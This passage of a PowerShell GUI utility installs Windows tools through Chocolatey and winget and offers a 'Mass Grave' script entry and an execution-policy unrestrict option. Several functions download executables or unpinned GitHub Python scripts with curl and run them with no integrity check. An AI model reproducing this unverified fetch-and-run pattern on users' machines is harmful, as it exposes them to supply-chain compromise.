    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Google Chrome via Chocolatey... && choco upgrade googlechrome -y --install-if-not-installed --no-desktop-shortcut && echo. && echo Chrome installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-Zen {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Zen Browser via Chocolatey... && choco upgrade zen-browser --prerelease -y --install-if-not-installed --no-desktop-shortcut && echo. && echo Zen Browser installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-OBS {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing OBS Studio via Chocolatey... && choco upgrade obs-studio -y --install-if-not-installed --no-desktop-shortcut && echo. && echo OBS Studio installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}


function Install-LocalSend {
    $localSendCmd = ('echo Downloading LocalSend v1.17.0... && ' +
        'curl.exe -L --retry 3 --retry-delay 2 -o "%TEMP%\localsend.exe" "https://github.com/localsend/localsend/releases/download/v1.17.0/LocalSend-1.17.0-windows-x86-64.exe" && ' +
        'if exist "%TEMP%\localsend.exe" ' +
        '(echo Installing LocalSend silently... && start /wait "" "%TEMP%\localsend.exe" /VERYSILENT /SUPPRESSMSGBOXES /NORESTART /ALLUSERS && echo LocalSend installation completed.) ' +
        'else (echo Download failed.) && echo. && echo Press any key to exit . . . && pause >nul && exit')
    
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k", $localSendCmd
}

function Install-NotepadPP {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Notepad++ via Chocolatey... && choco upgrade notepadplusplus -y --install-if-not-installed --no-desktop-shortcut && echo. && echo Notepad++ installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-ShareX {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing ShareX via Chocolatey... && choco upgrade sharex -y --install-if-not-installed --no-desktop-shortcut && echo. && echo ShareX installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-QBit {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing qBittorrent via Chocolatey... && choco upgrade qbittorrent -y --install-if-not-installed --no-desktop-shortcut && echo. && echo qBittorrent installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

# ============================================================
#  Win Tools
# ============================================================

function Install-TestDisk {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Downloading TestDisk... && curl.exe -L --retry 3 --retry-delay 2 -o `"%USERPROFILE%\Downloads\testdisk-7.3-WIP.win64.zip`" `"https://www.cgsecurity.org/Download_and_donate.php/testdisk-7.3-WIP.win64.zip`" && echo. && echo Downloaded to Downloads folder. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-FreeRecover {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Downloading FreeRecover... && curl.exe -L --retry 3 --retry-delay 2 -o `"%TEMP%\FreeRecover.exe`" `"https://sourceforge.net/projects/freerecover/files/FreeRecover.exe`" && echo Running... && `"%TEMP%\FreeRecover.exe`" && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-KickassUndelete {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Downloading Kickass Undelete... && curl.exe -L --retry 3 --retry-delay 2 -o `"%TEMP%\KickassUndelete.exe`" `"https://sourceforge.net/projects/kickassundelete/files/Kickass%20Undelete%201.5.5/KickassUndelete_1.5.5.exe/download`" && echo Running... && `"%TEMP%\KickassUndelete.exe`" && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-CPUZ {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing CPU-Z (portable) via Chocolatey... run cpuz in cmd to run && choco upgrade cpuz -y --install-if-not-installed --no-desktop-shortcut && echo. && echo CPU-Z installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-HWiNFO {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing HWiNFO via Chocolatey... && choco upgrade hwinfo -y --install-if-not-installed --no-desktop-shortcut && echo. && echo HWiNFO installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-GPUZ {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing GPU-Z (portable) via Chocolatey... && choco upgrade gpu-z -y --install-if-not-installed --no-desktop-shortcut && echo. && echo GPU-Z installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-CrystalDiskInfo {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing CrystalDiskInfo via Chocolatey... && choco upgrade crystaldiskinfo -y --install-if-not-installed --no-desktop-shortcut && echo. && echo CrystalDiskInfo installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-CrystalDiskMark {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing CrystalDiskMark via Chocolatey... && choco upgrade crystaldiskmark -y --install-if-not-installed --no-desktop-shortcut && echo. && echo CrystalDiskMark installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-DriverStoreExplorer {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Checking/Installing DriverStore Explorer via Winget... && winget upgrade lostindark.DriverStoreExplorer --silent || winget install lostindark.DriverStoreExplorer --accept-package-agreements --accept-source-agreements --silent && echo. && echo Launching DriverStore Explorer... && start /b rapr && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-Ventoy {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Ventoy via Chocolatey... && choco upgrade ventoy -y --install-if-not-installed --no-desktop-shortcut && echo. && echo Ventoy installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-Rufus {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Rufus via Chocolatey... && choco upgrade rufus -y --install-if-not-installed --no-desktop-shortcut && echo. && echo Rufus installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-AnyBurn {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing AnyBurn via Winget... && winget upgrade PowerSoftware.AnyBurn --silent || winget install PowerSoftware.AnyBurn --accept-package-agreements --accept-source-agreements --silent && echo. && echo AnyBurn installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Run-GitCloner {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo === Git Cloner === && curl -L -o `"%TEMP%\git_batch_cloner.py`" https://raw.githubusercontent.com/afnan-nex/git-batch-cloner/main/git_batch_cloner.py && python `"%TEMP%\git_batch_cloner.py`" && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-Downly {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo === Downly === && aria2c >nul 2>&1 || choco upgrade aria2 -y --install-if-not-installed && curl -L -o Downly.py https://raw.githubusercontent.com/afnan-nex/Downly/main/Downly.py && python -m pip install customtkinter aria2p pillow && python Downly.py && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Run-MonkeytypeTui {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo === Monkeytype TUI === && curl -L -o monkeytype_tui.py https://raw.githubusercontent.com/afnan-nex/monkeytype-tui/main/monkeytype_tui.py && python -m pip install --upgrade textual && python monkeytype_tui.py && echo. && echo Press any key to exit . . . && pause >nul && exit"
}
# ============================================================
#  SECTION B: GUI COLOUR AND STYLE CONSTANTS
# ============================================================

$CLR_BG = [System.Drawing.Color]::FromArgb( 18, 18, 28)
$CLR_PANEL = [System.Drawing.Color]::FromArgb( 24, 24, 38)
$CLR_GROUP = [System.Drawing.Color]::FromArgb( 30, 30, 48)
$CLR_ACCENT = [System.Drawing.Color]::FromArgb( 99, 179, 237)
$CLR_BTN = [System.Drawing.Color]::FromArgb( 42, 42, 68)
$CLR_BTNHOV = [System.Drawing.Color]::FromArgb( 60, 60, 96)
$CLR_TEXT = [System.Drawing.Color]::FromArgb(218, 218, 232)
$CLR_MUTED = [System.Drawing.Color]::FromArgb(120, 120, 155)
$CLR_GREEN = [System.Drawing.Color]::FromArgb( 72, 199, 142)
$CLR_RED = [System.Drawing.Color]::FromArgb(252, 110, 110)
$CLR_YELLOW = [System.Drawing.Color]::FromArgb(253, 203, 88)
$CLR_RUNBTN = [System.Drawing.Color]::FromArgb( 72, 149, 239)
$CLR_RUNHOV = [System.Drawing.Color]::FromArgb( 48, 112, 192)
$CLR_SEP = [System.Drawing.Color]::FromArgb( 48, 48, 78)

$FNT_MAIN = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Regular)
$FNT_BOLD = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
$FNT_TITLE = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
$FNT_HEAD = New-Object System.Drawing.Font("Segoe UI", 13, [System.Drawing.FontStyle]::Bold)
$FNT_MONO = New-Object System.Drawing.Font("Consolas", 9, [System.Drawing.FontStyle]::Regular)
$FNT_SMALL = New-Object System.Drawing.Font("Segoe UI", 8, [System.Drawing.FontStyle]::Regular)

# ============================================================
#  SECTION C: TASK REGISTRY
#  Each task: @{ Name; Function; CheckBox; Button }
# ============================================================
$script:AllTasks = [System.Collections.Generic.List[hashtable]]::new()

# ============================================================
#  SECTION D: MAIN WINDOW
# ============================================================

$form = New-Object System.Windows.Forms.Form
$form.Text = "Tool Installer  -  by AFNAN"
$form.Size = New-Object System.Drawing.Size(1300, 600)
$form.MinimumSize = New-Object System.Drawing.Size(820, 620)
$form.StartPosition = "CenterScreen"
$form.BackColor = $CLR_BG
$form.ForeColor = $CLR_TEXT
$form.Font = $FNT_MAIN
$iconPath = "$env:TEMP\Tools-Installer.ico"
try {
    if (-not (Test-Path $iconPath)) {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/afnan-nex/tools-installer/main/Setup/Tools-Installer.ico" -OutFile $iconPath -UseBasicParsing -TimeoutSec 5 -ErrorAction Stop
    }
    $form.Icon = New-Object System.Drawing.Icon($iconPath)
}
catch {
    $form.Icon = [System.Drawing.SystemIcons]::Shield
}
$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::Sizable

# -- HEADER BAR ---------------------------------------------------------------
$pnlHeader = New-Object System.Windows.Forms.Panel
$pnlHeader.Dock = "Top"
$pnlHeader.Height = 62
$pnlHeader.BackColor = $CLR_PANEL
$form.Controls.Add($pnlHeader)

$lblTitle = New-Object System.Windows.Forms.Label
$lblTitle.Text = "  Tool Installer"
$lblTitle.Font = $FNT_HEAD
$lblTitle.ForeColor = $CLR_ACCENT
$lblTitle.AutoSize = $true
$lblTitle.Location = New-Object System.Drawing.Point(12, 8)
$pnlHeader.Controls.Add($lblTitle)

$lblSub = New-Object System.Windows.Forms.Label
$lblSub.Text = "  Check items for batch run   |   Click a button for immediate single execution"
$lblSub.Font = $FNT_SMALL
$lblSub.ForeColor = $CLR_MUTED
$lblSub.AutoSize = $true
$lblSub.Location = New-Object System.Drawing.Point(12, 36)
$pnlHeader.Controls.Add($lblSub)

$btnGithub = New-Object System.Windows.Forms.Button
$btnGithub.Text = "GitHub"
$btnGithub.Font = $FNT_MAIN
$btnGithub.ForeColor = $CLR_ACCENT
$btnGithub.BackColor = $CLR_BTN
$btnGithub.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$btnGithub.FlatAppearance.BorderColor = $CLR_ACCENT
$btnGithub.FlatAppearance.BorderSize = 1
$btnGithub.FlatAppearance.MouseOverBackColor = $CLR_BTNHOV
$btnGithub.Size = New-Object System.Drawing.Size(80, 26)
$btnGithub.Location = New-Object System.Drawing.Point(782, 17)
$btnGithub.Anchor = "Top,Right"
$btnGithub.Cursor = [System.Windows.Forms.Cursors]::Hand
$btnGithub.Add_Click({ Open-Github })
$pnlHeader.Controls.Add($btnGithub)

$chkSelectAll = New-Object System.Windows.Forms.CheckBox
$chkSelectAll.Text = "Select All"
$chkSelectAll.Font = $FNT_MAIN
$chkSelectAll.ForeColor = $CLR_TEXT
$chkSelectAll.BackColor = [System.Drawing.Color]::Transparent
$chkSelectAll.Size = New-Object System.Drawing.Size(90, 26)
$chkSelectAll.Cursor = [System.Windows.Forms.Cursors]::Hand
$chkSelectAll.Add_CheckedChanged({
    $checked = $chkSelectAll.Checked
    foreach ($t in $script:AllTasks) {
        $t.CheckBox.Checked = $checked
    }
})
$pnlHeader.Controls.Add($chkSelectAll)

$txtSearch = New-Object System.Windows.Forms.TextBox
$txtSearch.Text = "Search..."
$txtSearch.Font = $FNT_MAIN
$txtSearch.ForeColor = $CLR_MUTED
$txtSearch.BackColor = $CLR_PANEL
$txtSearch.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$txtSearch.Size = New-Object System.Drawing.Size(150, 20)
$txtSearch.Location = New-Object System.Drawing.Point(884, 21)
$txtSearch.Anchor = "Top,Right"
$txtSearch.Add_GotFocus({
    if ($txtSearch.Text -eq "Search...") {
        $script:SkipSearchUpdate = $true
        $txtSearch.Text = ""
        $txtSearch.ForeColor = $CLR_TEXT
        $script:SkipSearchUpdate = $false
    }
})
$txtSearch.Add_LostFocus({
    if ([string]::IsNullOrWhiteSpace($txtSearch.Text)) {
        $script:SkipSearchUpdate = $true
        $txtSearch.Text = "Search..."
        $txtSearch.ForeColor = $CLR_MUTED
        $script:SkipSearchUpdate = $false
    }
})
$txtSearch.Add_TextChanged({
    if ($script:SkipSearchUpdate) { return }
    $query = $txtSearch.Text.Trim()
    $isQueryEmpty = ($query -eq "") -or ($query -eq "Search...")

    foreach ($gb in $pnlScroll.Controls) {
        if ($gb -is [System.Windows.Forms.GroupBox]) {
            $gb.Visible = $true
        }
    }

    foreach ($t in $script:AllTasks) {
        $gb = $t.Button.Parent.Parent
        if ($isQueryEmpty) {
            $match = $true
        } else {
            $match = ($t.Name -match "(?i)" + [regex]::Escape($query)) -or ($gb.Text -match "(?i)" + [regex]::Escape($query))
            if (-not $match -and $null -ne $t.Function) {
                $funcText = $t.Function.ToString()
                $match = $funcText -match "(?i)" + [regex]::Escape($query)
            }
        }
        $t.Button.Visible = $match
        $t.CheckBox.Visible = $match
    }

    $ROW_H = 32
    $PAD_TOP = 26
    $PAD_BOT = 8
    $cols = @{}
    
    foreach ($gb in $pnlScroll.Controls) {
        if ($gb -is [System.Windows.Forms.GroupBox]) {
            if ($null -eq $gb.Tag) {
                $gb.Tag = $gb.Location.Y
            }

            $inner = $gb.Controls[0]
            $ry = 2
            $visibleCount = 0

            foreach ($t in $script:AllTasks) {
                if ($t.Button.Parent.Parent -eq $gb) {
                    if ($t.Button.Visible) {
                        $t.CheckBox.Location = New-Object System.Drawing.Point(6, ($ry + 1))
                        $t.Button.Location = New-Object System.Drawing.Point(30, $ry)
                        $ry += $ROW_H
                        $visibleCount++
                    }
                }
            }

            if ($visibleCount -eq 0) {
                $gb.Visible = $false
            } else {
                $gb.Visible = $true
                $gbH = $PAD_TOP + ($visibleCount * $ROW_H) + $PAD_BOT
                $gb.Size = New-Object System.Drawing.Size(236, $gbH)
                $inner.Size = New-Object System.Drawing.Size(234, ($gbH - $PAD_TOP))
            }

            $x = $gb.Location.X
            if (-not $cols.Contains($x)) {
                $cols[$x] = [System.Collections.ArrayList]::new()
            }
            $cols[$x].Add($gb) | Out-Null
        }
    }

    $START_Y = 12
    $GAP_Y = 14

    foreach ($x in $cols.Keys) {
        $colGbs = $cols[$x] | Sort-Object -Property @{Expression={ [int]$_.Tag }; Descending=$false}
        
        $currentY = $START_Y
        foreach ($gb in $colGbs) {
            if ($gb.Visible) {
                $gb.Location = New-Object System.Drawing.Point($x, $currentY)
                $currentY += $gb.Height + $GAP_Y
            }
        }
    }
})

$txtSearch.Add_KeyDown({
    param($s, $e)
    if ($e.KeyCode -eq [System.Windows.Forms.Keys]::Enter) {
        $e.SuppressKeyPress = $true
        $e.Handled = $true
        
        $visibleTasks = @()
        foreach ($t in $script:AllTasks) {
            if ($t.Button.Visible) {
                $visibleTasks += $t
            }
        }
        
        if ($visibleTasks.Count -eq 1) {
            $task = $visibleTasks[0]
            $name = $task.Name
            $f = $task.Function
            Write-Log "Launching: $name ..." -Level Running
            try {
                & $f
                Write-Log "$name - launched." -Level Success
            }
            catch {
                Write-Log "ERROR: $name - $($_.Exception.Message)" -Level Error
            }
        }

        $txtSearch.Focus()
        $txtSearch.Select($txtSearch.Text.Length, 0)
        $script:SearchRefocusTicks = 0
        $script:SearchRefocusTimer.Start()
    }
})
$pnlHeader.Controls.Add($txtSearch)

$script:SearchRefocusTimer = New-Object System.Windows.Forms.Timer
$script:SearchRefocusTimer.Interval = 100
$script:SearchRefocusTicks = 0
$script:SearchRefocusTimer.Add_Tick({
    $script:SearchRefocusTicks++
    $txtSearch.Focus()
    try { [Native.Fw]::SetForegroundWindow($form.Handle) | Out-Null } catch {}
    if ($script:SearchRefocusTicks -ge 25) {
        $script:SearchRefocusTimer.Stop()
        $script:SearchRefocusTicks = 0
    }
})

# -- BOTTOM PANEL (Controls only, no log box) ---------------------------------
$pnlBottom = New-Object System.Windows.Forms.Panel
$pnlBottom.Dock = "Bottom"
$pnlBottom.Height = 44
$pnlBottom.BackColor = $CLR_PANEL
$form.Controls.Add($pnlBottom)

# Separator at top of bottom panel
$pnlSep = New-Object System.Windows.Forms.Panel
$pnlSep.Dock = "Top"
$pnlSep.Height = 2
$pnlSep.BackColor = $CLR_SEP
$pnlBottom.Controls.Add($pnlSep)

# Status Label (displays ongoing/clicked action)
$script:LblStatus = New-Object System.Windows.Forms.Label
$script:LblStatus.Text = "Ready"
$script:LblStatus.Font = $FNT_MAIN
$script:LblStatus.ForeColor = $CLR_MUTED
$script:LblStatus.Location = New-Object System.Drawing.Point(12, 12)
$script:LblStatus.Size = New-Object System.Drawing.Size(400, 20)
$script:LblStatus.Anchor = "Top,Left"
$script:LblStatus.Visible = $true
$pnlBottom.Controls.Add($script:LblStatus)

$btnUpgradeAll = New-Object System.Windows.Forms.Button
$btnUpgradeAll.Text = "choco update"
$btnUpgradeAll.Font = $FNT_MAIN
$btnUpgradeAll.ForeColor = $CLR_TEXT
$btnUpgradeAll.BackColor = $CLR_BTN
$btnUpgradeAll.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$btnUpgradeAll.FlatAppearance.BorderColor = $CLR_SEP
$btnUpgradeAll.FlatAppearance.BorderSize = 1
$btnUpgradeAll.FlatAppearance.MouseOverBackColor = $CLR_BTNHOV
$btnUpgradeAll.Size = New-Object System.Drawing.Size(100, 26)
$btnUpgradeAll.Location = New-Object System.Drawing.Point(735, 8)
$btnUpgradeAll.Cursor = [System.Windows.Forms.Cursors]::Hand
$btnUpgradeAll.Add_Click({ Start-Process cmd -WindowStyle Minimized -ArgumentList "/k", "choco upgrade all -y --no-desktop-shortcut && echo. && echo Press any key to exit . . . && pause >nul && exit" })
$pnlBottom.Controls.Add($btnUpgradeAll)

$btnWingetUpgradeAll = New-Object System.Windows.Forms.Button
$btnWingetUpgradeAll.Text = "winget update"
$btnWingetUpgradeAll.Font = $FNT_MAIN
$btnWingetUpgradeAll.ForeColor = $CLR_TEXT
$btnWingetUpgradeAll.BackColor = $CLR_BTN
$btnWingetUpgradeAll.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$btnWingetUpgradeAll.FlatAppearance.BorderColor = $CLR_SEP
$btnWingetUpgradeAll.FlatAppearance.BorderSize = 1
$btnWingetUpgradeAll.FlatAppearance.MouseOverBackColor = $CLR_BTNHOV
$btnWingetUpgradeAll.Size = New-Object System.Drawing.Size(100, 26)
$btnWingetUpgradeAll.Location = New-Object System.Drawing.Point(845, 8)
$btnWingetUpgradeAll.Cursor = [System.Windows.Forms.Cursors]::Hand
$btnWingetUpgradeAll.Add_Click({ Start-Process winget -WindowStyle Minimized -ArgumentList "upgrade", "--all", "--silent", "--accept-source-agreements", "--accept-package-agreements" })
$pnlBottom.Controls.Add($btnWingetUpgradeAll)

$script:BtnRun = New-Object System.Windows.Forms.Button
$script:BtnRun.Text = "Run selected"
$script:BtnRun.Font = $FNT_MAIN
$script:BtnRun.ForeColor = $CLR_TEXT
$script:BtnRun.BackColor = $CLR_BTN
$script:BtnRun.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$script:BtnRun.FlatAppearance.BorderColor = $CLR_SEP
$script:BtnRun.FlatAppearance.BorderSize = 1
$script:BtnRun.FlatAppearance.MouseOverBackColor = $CLR_BTNHOV
$script:BtnRun.Size = New-Object System.Drawing.Size(100, 26)
$script:BtnRun.Location = New-Object System.Drawing.Point(955, 8)
$script:BtnRun.Cursor = [System.Windows.Forms.Cursors]::Hand
$pnlBottom.Controls.Add($script:BtnRun)

# -- SCROLLABLE MAIN CONTENT PANEL --------------------------------------------
try {
    $pnlScroll = New-Object ti_NoJumpPanel
} catch {
    Write-Host "[WARN] Could not create ti_NoJumpPanel, using default Panel" -ForegroundColor Yellow
    $pnlScroll = New-Object System.Windows.Forms.Panel
}
$pnlScroll.Dock = "Fill"
$pnlScroll.AutoScroll = $true
$pnlScroll.BackColor = $CLR_BG
$form.Controls.Add($pnlScroll)
$pnlScroll.BringToFront()

# Mouse-wheel forwarding so scrolling works over child controls
$wheelHandler = [System.Windows.Forms.MouseEventHandler] {
    param($sender, $e)
    $scrollStep = [Math]::Round($e.Delta / 8)   # divide raw delta (~120) for smooth feel current (8) increase for more smooth and decrease for faster
    $newY = [Math]::Max(0, - $pnlScroll.AutoScrollPosition.Y - $scrollStep)
    $pnlScroll.AutoScrollPosition = New-Object System.Drawing.Point(
        - $pnlScroll.AutoScrollPosition.X, $newY)
}

$pnlScroll.Add_MouseWheel($wheelHandler)
$form.Add_MouseWheel($wheelHandler)

# ============================================================
#  SECTION E: HELPER FUNCTIONS FOR BUILDING GUI ROWS
# ============================================================

function Write-Log {
    param([string]$Message, [string]$Level = "Info")
    $color = switch ($Level) {
        "Running" { $CLR_YELLOW }
        "Success" { $CLR_GREEN }
        "Error" { $CLR_RED }
        default { $CLR_TEXT }
    }
    $ts = (Get-Date).ToString("HH:mm:ss")
    $line = "[$ts] $Message"
    $script:LblStatus.Invoke([System.Action] {
            $script:LblStatus.ForeColor = $color
            $script:LblStatus.Text = $line
        })
}

function New-TaskRow {
    param(
        [string]         $Name,
        [scriptblock]    $Func,
        [System.Windows.Forms.Panel] $Parent,
        [int]            $Y
    )

    # CheckBox (for batch queue)
    $cb = New-Object System.Windows.Forms.CheckBox
    $cb.Text = ""
    $cb.ForeColor = $CLR_TEXT
    $cb.BackColor = [System.Drawing.Color]::Transparent
    $cb.Size = New-Object System.Drawing.Size(20, 26)
    $cb.Location = New-Object System.Drawing.Point(6, ($Y + 1))
    $cb.Cursor = [System.Windows.Forms.Cursors]::Hand
    $Parent.Controls.Add($cb)

    # Button (immediate execution)
    $btn = New-Object System.Windows.Forms.Button
    $btn.Text = $Name
    $btn.Font = $FNT_MAIN
    $btn.ForeColor = $CLR_TEXT
    $btn.BackColor = $CLR_BTN
    $btn.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
    $btn.FlatAppearance.BorderColor = $CLR_SEP
    $btn.FlatAppearance.BorderSize = 1
    $btn.FlatAppearance.MouseOverBackColor = $CLR_BTNHOV
    $btn.FlatAppearance.MouseDownBackColor = $CLR_ACCENT
    $btn.TextAlign = [System.Drawing.ContentAlignment]::MiddleLeft
    $btn.Size = New-Object System.Drawing.Size(190, 26)
    $btn.Location = New-Object System.Drawing.Point(30, $Y)
    $btn.Cursor = [System.Windows.Forms.Cursors]::Hand
    $btn.Tag = $Func
    $Parent.Controls.Add($btn)

    # Wire mouse-wheel on button and checkbox to the scroll panel
    $btn.Add_MouseWheel($wheelHandler)
    $cb.Add_MouseWheel($wheelHandler)

    # Immediate-run on button click
    $btn.Add_Click({
            param($s, $e)
            $f = $s.Tag
            $name = $s.Text
            Write-Log "Launching: $name ..." -Level Running
            try {
                & $f
                Write-Log "$name - launched." -Level Success
            }
            catch {
                Write-Log "ERROR: $name - $($_.Exception.Message)" -Level Error
            }
        })

    # Register in global list
    $entry = @{ Name = $Name; Function = $Func; CheckBox = $cb; Button = $btn }
    $script:AllTasks.Add($entry)
    return $entry
}

function New-CategoryGroup {
    param(
        [string]  $Title,
        [array]   $Items,
        [System.Windows.Forms.Panel] $Parent,
        [int]     $X,
        [int]     $Y
    )
    $ROW_H = 32
    $PAD_TOP = 26
    $PAD_BOT = 8
    $gbH = $PAD_TOP + ($Items.Count * $ROW_H) + $PAD_BOT

    $gb = New-Object System.Windows.Forms.GroupBox
    $gb.Text = $Title
    $gb.Font = $FNT_TITLE
    $gb.ForeColor = $CLR_ACCENT
    $gb.BackColor = $CLR_GROUP
    $gb.Size = New-Object System.Drawing.Size(236, $gbH)
    $gb.Location = New-Object System.Drawing.Point($X, $Y)
    $gb.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
    $Parent.Controls.Add($gb)

    $inner = New-Object System.Windows.Forms.Panel
    $inner.BackColor = [System.Drawing.Color]::Transparent
    $inner.Size = New-Object System.Drawing.Size(234, ($gbH - $PAD_TOP))
    $inner.Location = New-Object System.Drawing.Point(0, $PAD_TOP)
    $gb.Controls.Add($inner)

    $inner.Add_MouseWheel($wheelHandler)
    $gb.Add_MouseWheel($wheelHandler)

    $ry = 2
    foreach ($item in $Items) {
        New-TaskRow -Name $item.Name -Func $item.Func -Parent $inner -Y $ry | Out-Null
        $ry += $ROW_H
    }
    return $gb
}

# ============================================================
#  SECTION F: POPULATE ALL CATEGORIES
# ============================================================

$COL_W = 250   # column stride (group width 236 + 14 gap)
$GAP_Y = 14
$START_X = 14
$START_Y = 12
$colY = @($START_Y, $START_Y, $START_Y, $START_Y, $START_Y)   # current Y per column

function Add-Category {
    param([int]$Col, [string]$Title, [array]$Items)
    $x = $START_X + $Col * $COL_W
    $gb = New-CategoryGroup -Title $Title -Items $Items -Parent $pnlScroll -X $x -Y $colY[$Col]
    $colY[$Col] += $gb.Height + $GAP_Y
}

# Column 0 ---------------------------------------------------------------------
Add-Category -Col 0 -Title "About AFNAN" -Items @(
    @{ Name = "Open Portfolio"; Func = { Open-Portfolio } }
)

Add-Category -Col 0 -Title "PowerShell Tweaks" -Items @(
    @{ Name = "See Policy"; Func = { See-Policy } },
    @{ Name = "Unrestrict Policy"; Func = { Unrestrict-Policy } }
)

Add-Category -Col 0 -Title "Essential" -Items @(
    @{ Name = "Chocolatey"; Func = { Install-Choco } },
    @{ Name = "Node.js LTS"; Func = { Install-NodeLTS } },
    @{ Name = "Scoop"; Func = { Install-Scoop } },
    @{ Name = "pnpm"; Func = { Install-Pnpm } },
    @{ Name = "Yarn"; Func = { Install-Yarn } },
    @{ Name = "Bun"; Func = { Install-Bun } },
    @{ Name = "Go"; Func = { Install-Go } },
    @{ Name = "Deno"; Func = { Install-Deno } }
)

Add-Category -Col 0 -Title "Automation" -Items @(
    @{ Name = "n8n Workflow Automation"; Func = { Install-N8N } },
    @{ Name = "Google Workspace CLI (GWS)"; Func = { Install-GWS } }
)

Add-Category -Col 0 -Title "Control Panel" -Items @(
    @{ Name = "Classic Control Panel"; Func = { Open-ControlPanel } },
    @{ Name = "Devices and Printers"; Func = { Open-DevicesAndPrinters } },
    @{ Name = "Task Manager"; Func = { Open-TaskManager } },
    @{ Name = "Device Manager"; Func = { Open-DeviceManager } },
    @{ Name = "Disk Management"; Func = { Open-DiskManagement } },
    @{ Name = "System Properties"; Func = { Open-SystemProperties } },
    @{ Name = "System Config (MSConfig)"; Func = { Open-MSConfig } },
    @{ Name = "Power Options"; Func = { Open-PowerOptions } }
)

# Column 1 ---------------------------------------------------------------------
Add-Category -Col 1 -Title "Recommended Tools" -Items @(
    @{ Name = "Git"; Func = { Install-Git } },
    @{ Name = "Python"; Func = { Install-Python } },
    @{ Name = ".NET Runtime"; Func = { Install-Dotnet } },
    @{ Name = "FFmpeg"; Func = { Install-FFmpeg } },
    @{ Name = "7-Zip"; Func = { Install-7Zip } },
    @{ Name = "PeaZip"; Func = { Install-PeaZip } },
    @{ Name = "WinDirStat"; Func = { Install-WinDirStat } },
    @{ Name = "yt-dlp"; Func = { Install-YTDLP } },
    @{ Name = "ngrok"; Func = { Install-Ngrok } },
    @{ Name = "localtunnel"; Func = { Install-Localtunnel } },
    @{ Name = "miniserve"; Func = { Install-Miniserve } }
)

Add-Category -Col 1 -Title "Other Apps" -Items @(
    @{ Name = "Fast Stone Image"; Func = { Install-FastStone } },
    @{ Name = "Vlc"; Func = { Install-VLC } },
    @{ Name = "MPC HC"; Func = { Install-MPC-HC } },
    @{ Name = "Only Office"; Func = { Install-OnlyOffice } },
    @{ Name = "Kdenlive"; Func = { Install-Kdenlive } },
    @{ Name = "HandBrake"; Func = { Install-HandBrake } },
    @{ Name = "AntiGravity IDE"; Func = { Install-AntiGravity-ide } },
    @{ Name = "VS Code"; Func = { Install-VSCode } },
    @{ Name = "IDM"; Func = { Install-IDM } },
    @{ Name = "Ghost Downloader"; Func = { Install-GhostDownloader } },
    @{ Name = "Virtual Box"; Func = { Install-VirtualBox } }
)

# Column 2 ---------------------------------------------------------------------
Add-Category -Col 2 -Title "Run Scripts" -Items @(
    @{ Name = "Chris Titus Tool"; Func = { Run-Titus } },
    @{ Name = "Mass Grave"; Func = { Run-MassGrave } },
    @{ Name = "Win11 Debloat"; Func = { Run-Win11Debloat } },
